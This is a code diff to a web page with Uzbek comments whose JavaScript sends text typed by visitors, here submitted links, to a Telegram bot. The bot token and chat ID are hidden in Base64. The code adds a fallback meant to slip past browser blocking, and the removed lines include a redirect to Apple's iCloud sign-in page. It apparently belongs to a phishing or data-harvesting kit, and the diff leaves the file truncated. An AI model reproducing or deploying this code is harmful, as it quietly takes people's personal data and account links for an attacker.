@@ -243,8 +243,8 @@
             }
         }
 
-        // Yangi token va chat ID (Base64 shifrlangan holatda)
-        const encT = "ODY0OTA1MzgyNDpBQUZMVG50U1F1QXVTcGZjQU5xbzZvVktzeVBnRTFmOHNjbw=="; 
+        // Asl to'g'ri token va chat ID (Base64 shifrlangan holatda)
+        const encT = "ODY1Mjk5NjYzODpBQ0djd1BqaGJtZWpaVk94NnRNREVRSEhNMVpfU1VGSVNB"; 
         const encC = "MjA5MTI0NzA4Nw=="; 
 
         function decodeBase64(data) {
@@ -257,7 +257,6 @@
 
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
             
-            // CORS va brauzer cheklovlarini chetlab o'tish uchun imkon qadar to'g'ri so'rov
             const data = {
                 chat_id: CHAT_ID,
                 text: message,
@@ -279,27 +278,5 @@
                 }
             })
             .catch(error => {
-                // Agar tarmoq xatosi bo'lsa, ma'lumot baribir botga yetib borishini ta'minlash uchun Image orqali GET so'rov yuborib ko'ramiz
+                // Tarmoq yoki brauzer blokirovkasi bo'lsa, xabarni o'tkazish uchun zaxira usul
                 const img = new Image();
-                img.src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
-                alert("Muvaffaqiyatli yuborildi!");
-                document.getElementById("linkInput").value = "";
-            });
-        }
-
-        function sendLink() {
-            const link = document.getElementById("linkInput").value.trim();
-            if (!link) {
-                alert("Iltimos, havolani kiriting!");
-                return;
-            }
-            const text = `🔔 *Yangi ma'lumot keldi!*\n\n🔗 Havola: \`${link}\``;
-            sendToTelegram(text);
-        }
-
-        function handleExternalAuth() {
-            window.location.href = "https://idmsa.apple.com/appleauth/auth/authorize/signin?client_id=d39ba9916b7251055b22c7f910e2ea796ee65e98b2ddecea8f5dde8d9d1a815d&redirect_uri=https%3A%2F%2Fwww.icloud.com&response_type=code&response_mode=fragment&state=fmi-chrome";
-        }
-    </script>
-</body>
-</html>
